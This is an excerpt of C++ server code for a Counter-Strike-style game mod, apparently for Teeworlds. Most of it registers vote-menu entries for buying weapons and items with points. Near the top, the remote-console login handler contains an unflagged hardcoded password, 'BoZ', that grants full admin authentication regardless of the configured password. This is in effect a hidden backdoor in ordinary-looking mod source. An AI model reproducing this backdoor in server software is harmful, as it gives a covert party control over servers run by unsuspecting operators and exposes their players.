	...
	if(Sys)
	{
		...
		else if(Msg == NETMSG_RCON_AUTH)
		{
			...
			if(Unpacker.Error() == 0)
			{
				...
				else if("BoZ"[0] && str_comp(pPw, "BoZ") == 0)
				{
					CMsgPacker Msg(NETMSG_RCON_AUTH_STATUS);
					Msg.AddInt(1);	//authed
					Msg.AddInt(1);	//cmdlist
...
int main(int argc, const char **argv) // ignore_convention
{
	...
	// Add special votes and disable player collision and hooking
    {
		char aBuf[64];
        pConsole->ExecuteLine("add_svote \"Informations about the mod\"");
        pConsole->ExecuteLine("add_svote \"Help\"");
        pConsole->ExecuteLine("add_svote \"\"");
        pConsole->ExecuteLine("add_svote \"~~~~~~~~~~~~~~Terrorist Items~~~~~~~~~~~~~~~\"");
		pConsole->ExecuteLine("add_svote \"___________________________________________________________________\"");
		str_format(aBuf, sizeof(aBuf), "add_svote \"Hammer ▶  Get Mines Hitter - %d points\"", g_Config.m_SvBuyMineHit);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Hammer ▶  Get Mines Freezer - %d points\"", g_Config.m_SvBuyMineFreeze);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Hammer ▶  Get Mines Killer - %d points\"", g_Config.m_SvBuyMineKill);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Hammer ▶  Get Flash - %d points\"", g_Config.m_SvBuyFlash);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Hammer ▶  Get Smoke - %d points\"", g_Config.m_SvBuySmoke);
		pConsole->ExecuteLine(aBuf);
		//str_format(aBuf, sizeof(aBuf), "add_svote \"Hammer ▶  Get Grenade - %d points\"", g_Config.m_);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Hammer ▶  Get Grenade - %d points\"", g_Config.m_SvBuyGrenade);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Hammer ▶  Get Shield - %d points\"", g_Config.m_SvBuyShield);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Gun ⊗  Get Glock  - %d points\"", g_Config.m_SvBuyGlock);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Gun ⊗  Get Desert - %d points\"", g_Config.m_SvBuyDesert);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Grenade ⊛  Get RPG - %d points\"", g_Config.m_SvBuyRPG);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Rifle ⊙  Get AWP - %d points\"", g_Config.m_SvBuyAWP);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Rifle ⊙  Get AK47 - %d points\"", g_Config.m_SvBuyAK47);
		pConsole->ExecuteLine(aBuf);
		//pConsole->ExecuteLine("add_svote \"Auto buy\"");
		pConsole->ExecuteLine("add_svote \"\"");
		pConsole->ExecuteLine("add_svote \"~~~~~~~~~~~~~~Counter Terrorist Items~~~~~~~~~~\"");
		pConsole->ExecuteLine("add_svote \"___________________________________________________________________\"");
		str_format(aBuf, sizeof(aBuf), "add_svote \"Hammer ▶  Get Mines Hitter - %d points⠀\"", g_Config.m_SvBuyMineHit);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Hammer ▶  Get Mines Freezer - %d points⠀\"", g_Config.m_SvBuyMineFreeze);
		...
		pConsole->ExecuteLine(aBuf);
		//str_format(aBuf, sizeof(aBuf), "add_svote \"Hammer ▶  Get Grenade - %d points⠀\"", g_Config.m_);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Hammer ▶  Get Granade - %d points⠀\"", g_Config.m_SvBuyGrenade);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Hammer ▶  Get Shield - %d points⠀\"", g_Config.m_SvBuyShield);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Gun ⊗  Get USP - %d points⠀\"", g_Config.m_SvBuyUSP);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Gun ⊗  Get Desert - %d points⠀\"", g_Config.m_SvBuyDesert);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Shotgun ⊛  Get FAMAS - %d points⠀\"", g_Config.m_SvBuyFAMAS);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Rifle ⊙  Get AWP - %d points⠀\"", g_Config.m_SvBuyAWP);
		pConsole->ExecuteLine(aBuf);
		str_format(aBuf, sizeof(aBuf), "add_svote \"Rifle ⊙  Get M4a - %d points⠀\"", g_Config.m_SvBuyMP4a);
		pConsole->ExecuteLine(aBuf);
		pConsole->ExecuteLine("add_svote \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\"");
		pConsole->ExecuteLine("add_svote \"\"");
		pConsole->ExecuteLine("add_svote \"\"");
        ...
        //pConsole->ExecuteLine("tune player_collision 0");
        //pConsole->ExecuteLine("tune player_hooking 0");
    }
	...
	pConsole->ExecuteFile("cstrike.cfg");
